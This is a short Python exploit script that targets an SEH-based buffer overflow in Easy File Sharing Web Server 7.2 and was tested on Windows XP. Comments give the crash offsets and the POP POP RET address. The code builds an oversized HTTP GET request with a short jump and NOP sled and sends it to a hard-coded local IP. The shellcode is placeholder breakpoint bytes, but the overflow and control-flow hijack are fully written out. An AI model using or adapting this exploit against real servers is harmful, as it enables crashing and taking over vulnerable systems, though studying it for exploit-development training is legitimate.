#!/usr/bin/python

# Author: Michael Music
# Date: 8/3/2019
# Description: Easy File Sharing Web Server 7.2 BOF - SEH based
#  Tested on Windows XP

import socket
import os
import sys

# Initial crash happened with 6707 As
# EAX at offset 4193
# nSEH at offset 4061 with 2931 bytes of space after 
# SEH at offset 4065
# POP POP RET in application module at 0x100195f2
#buf = 'A' * 7000

# Initial junk to cause crash
buf = 'A' * 4061

# nSEH - needs to contain JMP code to jump to shellcode
# jmp short 10
buf += '\xeb\x08\x90\x90'

# SEH - needs to contain address to a POP POP RET
buf += '\xf2\x95\x01\x10'

# NOPs that the JMP at nSEH will jump into
buf += '\x90' * 15

# Shellcode
buf += '\xcc' * 500

# Remaining junk to cause crash
buf += 'D' * (7000 - len(buf))

exploit_string = 'GET ' + buf + ' HTTP/1.0\r\n\r\n'

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect(('192.168.1.116', 80))
expl.send(exploit_string)
expl.close()
